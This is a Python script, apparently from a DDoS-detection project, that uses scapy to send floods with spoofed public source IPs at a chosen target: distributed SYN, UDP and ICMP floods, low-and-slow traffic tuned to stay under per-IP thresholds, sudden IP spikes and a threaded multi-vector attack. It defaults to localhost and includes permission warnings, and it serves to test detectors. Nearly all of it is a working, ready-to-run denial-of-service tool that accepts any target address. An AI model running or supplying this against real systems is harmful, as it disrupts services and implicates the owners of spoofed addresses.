"""
DDoS Attack Simulation Script - Multi-Source Distributed Attack Simulator

This script simulates realistic DDoS attacks by spoofing multiple source IP addresses.
Unlike the single-source simulate_attack.py, this creates traffic that appears to come
from hundreds or thousands of different IPs - mimicking real botnet behavior.

ATTACK TYPES SIMULATED:
1. Distributed SYN Flood - SYN packets from many spoofed IPs
2. Distributed UDP Flood - UDP packets from many spoofed IPs  
3. Distributed ICMP Flood - Ping flood from many spoofed IPs
4. Low-and-Slow Attack - Each IP under threshold, but combined = overwhelming
5. IP Spike Attack - Sudden flood of many new source IPs
6. Multi-Vector Attack - Combined SYN + UDP + ICMP floods

Configuration is loaded from config/config.py for consistency with the detector.

IMPORTANT: 
- Only use this on systems you own or have permission to test!
- Requires root/admin privileges to craft raw packets with spoofed IPs
- Some ISPs may block spoofed packets (works best on local networks)

Usage:
    sudo python3 scripts/simulate_ddos.py --target 127.0.0.1 --type multi
"""

from scapy.all import IP, TCP, UDP, ICMP, Raw, send, RandShort
import sys
import time
import argparse
import random
import ipaddress
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List
import os
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

# =============================================================================
# CONFIGURATION - Load from config/config.py
# =============================================================================
try:
    from config.config import (
        DEFAULT_ATTACK_TARGET,
        DEFAULT_ATTACK_PORT,
        DEFAULT_PACKET_COUNT,
        DEFAULT_DDOS_SOURCES,
        DEFAULT_PACKET_DELAY,
        # Thresholds for reference
        PACKET_THRESHOLD,
        LOW_SLOW_PER_IP_MAX,
    )
    CONFIG_LOADED = True
except ImportError:
    CONFIG_LOADED = False
    # Fallback defaults
    DEFAULT_ATTACK_TARGET = "127.0.0.1"
    DEFAULT_ATTACK_PORT = 80
    DEFAULT_PACKET_COUNT = 200
    DEFAULT_DDOS_SOURCES = 100
    DEFAULT_PACKET_DELAY = 0.001
    PACKET_THRESHOLD = 100
    LOW_SLOW_PER_IP_MAX = 50


def generate_random_ip() -> str:
    """
    Generate a random public IP address for spoofing.
    Avoids private, loopback, and reserved ranges.
    
    Returns:
        str: Random public IP address
    """
    while True:
        # Generate random IP
        ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        try:
            ip_obj = ipaddress.ip_address(ip)
            # Avoid private, loopback, reserved, and multicast
            if not (ip_obj.is_private or ip_obj.is_loopback or 
                    ip_obj.is_reserved or ip_obj.is_multicast):
                return ip
        except ValueError:
            continue


def generate_botnet_ips(count: int, subnet_clusters: int = 10) -> List[str]:
    """
    Generate IPs that simulate a botnet - clustered in subnet groups.
    Real botnets often have IPs clustered in certain subnets.
    
    Args:
        count (int): Total number of IPs to generate
        subnet_clusters (int): Number of subnet clusters
        
    Returns:
        list: List of spoofed IP addresses
    """
    ips = []
    ips_per_cluster = count // subnet_clusters
    
    for _ in range(subnet_clusters):
        # Generate a random /24 subnet base
        base = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
        
        for _ in range(ips_per_cluster):
            ip = f"{base}.{random.randint(1, 254)}"
            ips.append(ip)
    
    # Fill remaining with random IPs
    while len(ips) < count:
        ips.append(generate_random_ip())
    
    return ips


def generate_geographic_ips(count: int, regions: List[str] = None) -> List[str]:
    """
    Generate IPs from specific geographic regions (simulated by IP ranges).
    
    Args:
        count (int): Number of IPs to generate
        regions (list): List of regions to simulate
        
    Returns:
        list: List of IP addresses
    """
    # Simplified regional IP ranges (first octets commonly associated with regions)
    regional_ranges = {
        'asia': [(1, 126), (202, 223)],
        'europe': [(77, 95), (176, 195)],
        'americas': [(24, 76), (96, 126)],
        'global': [(1, 223)]
    }
    
    if regions is None:
        regions = ['global']
    
    ips = []
    for _ in range(count):
        region = random.choice(regions)
        ranges = regional_ranges.get(region, regional_ranges['global'])
        range_choice = random.choice(ranges)
        
        first_octet = random.randint(range_choice[0], range_choice[1])
        ip = f"{first_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        ips.append(ip)
    
    return ips


def print_banner():
    """Print the script banner"""
    print("=" * 70)
    print("DDoS ATTACK SIMULATOR - Distributed Multi-Source Attacks")
    print("=" * 70)
    print()


def distributed_syn_flood(target_ip: str, target_port: int = 80, 
                          num_sources: int = 100, packets_per_source: int = 10,
                          delay: float = 0.001) -> dict:
    """
    Simulate a distributed SYN flood attack from multiple spoofed source IPs.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port (default: 80)
        num_sources (int): Number of spoofed source IPs (default: 100)
        packets_per_source (int): Packets per source IP (default: 10)
        delay (float): Delay between packets
        
    Returns:
        dict: Attack statistics
    """
    print(f"🌊 Starting DISTRIBUTED SYN FLOOD")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Spoofed Sources: {num_sources}")
    print(f"   Packets per Source: {packets_per_source}")
    print(f"   Total Packets: {num_sources * packets_per_source}")
    print()
    
    # Generate botnet-like IPs
    source_ips = generate_botnet_ips(num_sources)
    
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(),
                    dport=target_port,
                    flags='S',
                    seq=random.randint(0, 2**32-1)
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [SYN FLOOD] Sent: {sent} packets from {len(set(source_ips[:sent//packets_per_source + 1]))} sources...", end='', flush=True)
                
                time.sleep(delay)
    
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n✅ SYN Flood complete. Sent {sent} packets in {duration:.2f}s ({sent/duration:.2f} pps)")
    
    return {
        'type': 'distributed_syn_flood',
        'packets_sent': sent,
        'sources_used': num_sources,
        'duration': duration
    }


def distributed_udp_flood(target_ip: str, target_port: int = 53,
                          num_sources: int = 100, packets_per_source: int = 10,
                          payload_size: int = 512, delay: float = 0.001) -> dict:
    """
    Simulate a distributed UDP flood attack from multiple spoofed source IPs.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port (default: 53 for DNS)
        num_sources (int): Number of spoofed source IPs
        packets_per_source (int): Packets per source IP
        payload_size (int): Size of UDP payload in bytes
        delay (float): Delay between packets
        
    Returns:
        dict: Attack statistics
    """
    print(f"🌊 Starting DISTRIBUTED UDP FLOOD")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Spoofed Sources: {num_sources}")
    print(f"   Packets per Source: {packets_per_source}")
    print(f"   Payload Size: {payload_size} bytes")
    print(f"   Total Packets: {num_sources * packets_per_source}")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    payload = Raw(b"X" * payload_size)
    
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / UDP(
                    sport=RandShort(),
                    dport=target_port
                ) / payload
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [UDP FLOOD] Sent: {sent} packets from {len(set(source_ips[:sent//packets_per_source + 1]))} sources...", end='', flush=True)
                
                time.sleep(delay)
    
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n✅ UDP Flood complete. Sent {sent} packets in {duration:.2f}s ({sent/duration:.2f} pps)")
    
    return {
        'type': 'distributed_udp_flood',
        'packets_sent': sent,
        'sources_used': num_sources,
        'duration': duration
    }


def distributed_icmp_flood(target_ip: str, num_sources: int = 100,
                           packets_per_source: int = 10, delay: float = 0.001) -> dict:
    """
    Simulate a distributed ICMP flood (ping flood) from multiple spoofed source IPs.
    
    Args:
        target_ip (str): Target IP address
        num_sources (int): Number of spoofed source IPs
        packets_per_source (int): Packets per source IP
        delay (float): Delay between packets
        
    Returns:
        dict: Attack statistics
    """
    print(f"🌊 Starting DISTRIBUTED ICMP FLOOD")
    print(f"   Target: {target_ip}")
    print(f"   Spoofed Sources: {num_sources}")
    print(f"   Packets per Source: {packets_per_source}")
    print(f"   Total Packets: {num_sources * packets_per_source}")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for i in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / ICMP(
                    type=8,  # Echo request
                    code=0,
                    id=random.randint(0, 65535),
                    seq=i
                ) / Raw(b"X" * 56)  # Standard ping payload
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [ICMP FLOOD] Sent: {sent} packets from {len(set(source_ips[:sent//packets_per_source + 1]))} sources...", end='', flush=True)
                
                time.sleep(delay)
    
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n✅ ICMP Flood complete. Sent {sent} packets in {duration:.2f}s ({sent/duration:.2f} pps)")
    
    return {
        'type': 'distributed_icmp_flood',
        'packets_sent': sent,
        'sources_used': num_sources,
        'duration': duration
    }


def low_and_slow_attack(target_ip: str, target_port: int = 80,
                        num_sources: int = 200, packets_per_source: int = 40,
                        delay: float = 0.01) -> dict:
    """
    Simulate a "low and slow" DDoS attack.
    Each source sends traffic UNDER the detection threshold, but combined they overwhelm.
    
    This tests if the detector can identify distributed patterns where individual
    IPs appear legitimate but aggregate traffic is malicious.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port
        num_sources (int): Number of sources (should be high)
        packets_per_source (int): Packets per source (should be LOW - under threshold)
        delay (float): Delay between packets
        
    Returns:
        dict: Attack statistics
    """
    print(f"🐌 Starting LOW-AND-SLOW ATTACK")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Spoofed Sources: {num_sources}")
    print(f"   Packets per Source: {packets_per_source} (UNDER typical threshold)")
    print(f"   Total Packets: {num_sources * packets_per_source}")
    print()
    print(f"   ⚠️  Each source stays under threshold, but combined = {num_sources * packets_per_source} packets!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    
    sent = 0
    sources_completed = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            # Mix of SYN, UDP, and ACK packets
            for i in range(packets_per_source):
                packet_type = i % 3
                
                if packet_type == 0:
                    packet = IP(src=src_ip, dst=target_ip) / TCP(
                        sport=RandShort(), dport=target_port, flags='S'
                    )
                elif packet_type == 1:
                    packet = IP(src=src_ip, dst=target_ip) / UDP(
                        sport=RandShort(), dport=target_port
                    ) / Raw(b"X" * 64)
                else:
                    packet = IP(src=src_ip, dst=target_ip) / TCP(
                        sport=RandShort(), dport=target_port, flags='A'
                    )
                
                send(packet, verbose=0)
                sent += 1
                time.sleep(delay)
            
            sources_completed += 1
            if sources_completed % 20 == 0:
                print(f"\r   [LOW-SLOW] Sources: {sources_completed}/{num_sources} | Packets: {sent}...", end='', flush=True)
    
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n✅ Low-and-Slow complete. Sent {sent} packets from {sources_completed} sources in {duration:.2f}s")
    
    return {
        'type': 'low_and_slow',
        'packets_sent': sent,
        'sources_used': sources_completed,
        'packets_per_source': packets_per_source,
        'duration': duration
    }


def sudden_spike_attack(target_ip: str, target_port: int = 80,
                        num_sources: int = 500, duration_seconds: float = 2.0) -> dict:
    """
    Simulate a sudden spike in unique source IPs - tests spike detection.
    Sends packets from many unique IPs in a very short time window.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port
        num_sources (int): Number of unique source IPs
        duration_seconds (float): Time window for the spike
        
    Returns:
        dict: Attack statistics
    """
    print(f"⚡ Starting SUDDEN SPIKE ATTACK")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Unique Sources: {num_sources}")
    print(f"   Time Window: {duration_seconds}s")
    print(f"   New IPs per second: {num_sources / duration_seconds:.0f}")
    print()
    
    # Use completely random IPs for spike (not clustered like botnet)
    source_ips = [generate_random_ip() for _ in range(num_sources)]
    
    sent = 0
    delay = duration_seconds / num_sources
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            # Each IP sends just 1-2 packets
            packet = IP(src=src_ip, dst=target_ip) / TCP(
                sport=RandShort(), dport=target_port, flags='S'
            )
            send(packet, verbose=0)
            sent += 1
            
            if sent % 50 == 0:
                elapsed = time.time() - start_time
                print(f"\r   [SPIKE] New IPs: {sent} in {elapsed:.2f}s ({sent/elapsed:.0f} new IPs/sec)...", end='', flush=True)
            
            time.sleep(delay)
    
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n✅ Spike Attack complete. {sent} unique IPs in {duration:.2f}s ({sent/duration:.0f} new IPs/sec)")
    
    return {
        'type': 'sudden_spike',
        'unique_ips': sent,
        'duration': duration,
        'ips_per_second': sent / duration if duration > 0 else 0
    }


def coordinated_multi_vector(target_ip: str, target_port: int = 80,
                             num_sources: int = 150, duration_seconds: float = 10.0) -> dict:
    """
    Launch a coordinated multi-vector DDoS attack using multiple attack types simultaneously.
    This is the most realistic DDoS simulation - combining SYN, UDP, and ICMP floods.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port
        num_sources (int): Number of spoofed sources per attack type
        duration_seconds (float): Duration of the attack
        
    Returns:
        dict: Attack statistics
    """
    print(f"Starting COORDINATED MULTI-VECTOR DDoS ATTACK")
    print(f"   Target: {target_ip}")
    print(f"   Sources per Vector: {num_sources}")
    print(f"   Attack Vectors: SYN Flood + UDP Flood + ICMP Flood")
    print(f"   Duration: {duration_seconds}s")
    print()
    
    results = {}
    threads = []
    
    def run_attack(attack_func, **kwargs):
        return attack_func(**kwargs)
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = {
            executor.submit(distributed_syn_flood, target_ip, target_port, 
                          num_sources // 3, 5, 0.005): 'syn',
            executor.submit(distributed_udp_flood, target_ip, target_port + 1,
                          num_sources // 3, 5, 256, 0.005): 'udp',
            executor.submit(distributed_icmp_flood, target_ip,
                          num_sources // 3, 5, 0.005): 'icmp'
        }
        
        for future in as_completed(futures):
            attack_type = futures[future]
            try:
                results[attack_type] = future.result()
            except Exception as e:
                print(f"❌ {attack_type} attack failed: {e}")
    
    duration = time.time() - start_time
    
    total_packets = sum(r.get('packets_sent', 0) for r in results.values())
    total_sources = sum(r.get('sources_used', 0) for r in results.values())
    
    print()
    print("=" * 70)
    print("COORDINATED ATTACK SUMMARY")
    print("=" * 70)
    print(f"   Total Duration:     {duration:.2f} seconds")
    print(f"   Total Packets:      {total_packets}")
    print(f"   Total Source IPs:   {total_sources}")
    print(f"   Packets/second:     {total_packets / duration:.2f}")
    print()
    for attack_type, data in results.items():
        print(f"   {attack_type.upper():10}: {data.get('packets_sent', 0)} packets from {data.get('sources_used', 0)} sources")
    print("=" * 70)
    
    return {
        'type': 'coordinated_multi_vector',
        'total_packets': total_packets,
        'total_sources': total_sources,
        'duration': duration,
        'vectors': results
    }


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='DDoS Attack Simulator - Distributed Multi-Source Attacks',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Types:
  syn        - Distributed SYN flood from multiple spoofed IPs
  udp        - Distributed UDP flood from multiple spoofed IPs
  icmp       - Distributed ICMP flood (ping flood) from multiple spoofed IPs
  lowslow    - Low-and-slow attack (each IP under threshold)
  spike      - Sudden spike of new unique source IPs
  multi      - Coordinated multi-vector attack (SYN + UDP + ICMP)
  all        - Run all attack types sequentially

Examples:
  # Distributed SYN flood with 200 spoofed source IPs
  sudo python3 simulate_ddos.py --target 127.0.0.1 --type syn --sources 200
  
  # Low-and-slow attack (evades per-IP thresholds)
  sudo python3 simulate_ddos.py --target 127.0.0.1 --type lowslow --sources 500
  
  # Sudden spike attack (500 new IPs in 2 seconds)
  sudo python3 simulate_ddos.py --target 127.0.0.1 --type spike --sources 500
  
  # Multi-vector coordinated attack
  sudo python3 simulate_ddos.py --target 127.0.0.1 --type multi --sources 300

        """
    )
    
    parser.add_argument('--target', '-t', default=DEFAULT_ATTACK_TARGET,
                       help=f'Target IP address (default: {DEFAULT_ATTACK_TARGET})')
    parser.add_argument('--type', '-T', 
                       choices=['syn', 'udp', 'icmp', 'lowslow', 'spike', 'multi', 'all'],
                       default='multi',
                       help='Attack type (default: multi)')
    parser.add_argument('--port', '-p', type=int, default=DEFAULT_ATTACK_PORT,
                       help=f'Target port (default: {DEFAULT_ATTACK_PORT})')
    parser.add_argument('--sources', '-s', type=int, default=DEFAULT_DDOS_SOURCES,
                       help=f'Number of spoofed source IPs (default: {DEFAULT_DDOS_SOURCES})')
    parser.add_argument('--packets', '-n', type=int, default=10,
                       help='Packets per source IP (default: 10)')
    parser.add_argument('--delay', '-d', type=float, default=DEFAULT_PACKET_DELAY,
                       help=f'Delay between packets in seconds (default: {DEFAULT_PACKET_DELAY})')
    
    args = parser.parse_args()
    
    print_banner()
    
    print("⚠️  WARNING: This is a DDoS simulation tool for testing purposes only!")
    print("   Only use on systems you own or have explicit permission to test.")
    print("   Packets will be sent with SPOOFED source IP addresses.")
    print()
    print(f"Attack Configuration:")
    print(f"  Type:       {args.type.upper()}")
    print(f"  Target:     {args.target}:{args.port}")
    print(f"  Sources:    {args.sources} spoofed IPs")
    print(f"  Packets:    {args.packets} per source")
    print(f"  Total:      ~{args.sources * args.packets} packets")
    print()
    
    try:
        response = input("Continue with DDoS simulation? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("Attack cancelled.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nAttack cancelled.")
        sys.exit(0)
    
    print()
    
    # Execute attacks
    if args.type == 'syn':
        distributed_syn_flood(args.target, args.port, args.sources, args.packets, args.delay)
    elif args.type == 'udp':
        distributed_udp_flood(args.target, args.port, args.sources, args.packets, 512, args.delay)
    elif args.type == 'icmp':
        distributed_icmp_flood(args.target, args.sources, args.packets, args.delay)
    elif args.type == 'lowslow':
        low_and_slow_attack(args.target, args.port, args.sources, 40, args.delay * 10)
    elif args.type == 'spike':
        sudden_spike_attack(args.target, args.port, args.sources, 2.0)
    elif args.type == 'multi':
        coordinated_multi_vector(args.target, args.port, args.sources, 10.0)
    elif args.type == 'all':
        print("Running all attack types sequentially...\n")
        distributed_syn_flood(args.target, args.port, args.sources // 2, 5, args.delay)
        print("\n" + "-" * 70 + "\n")
        distributed_udp_flood(args.target, args.port, args.sources // 2, 5, 512, args.delay)
        print("\n" + "-" * 70 + "\n")
        distributed_icmp_flood(args.target, args.sources // 2, 5, args.delay)
        print("\n" + "-" * 70 + "\n")
        low_and_slow_attack(args.target, args.port, args.sources, 40, args.delay * 10)
        print("\n" + "-" * 70 + "\n")
        sudden_spike_attack(args.target, args.port, args.sources, 2.0)
    
    print()
    print("=" * 70)
    print("✅ Check your DDoS detector for alerts!")
    print("   The detector should identify:")
    print("   - Multiple source IPs")
    print("   - Aggregate traffic volume")
    print("   - Sudden IP spike patterns")
    print("   - Distributed attack signatures")
    print("=" * 70)


if __name__ == "__main__":
    # Check if running as root (required for IP spoofing)
    if os.name == 'nt':  # Windows
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("❌ This script requires Administrator privileges on Windows.")
            print("   Please run as Administrator.")
            sys.exit(1)
    else:  # Linux/Unix
        if os.geteuid() != 0:
            print("❌ This script requires root privileges to spoof IP addresses.")
            print("   Please run with sudo:")
            print(f"   sudo python3 {sys.argv[0]}")
            sys.exit(1)
    
    main()

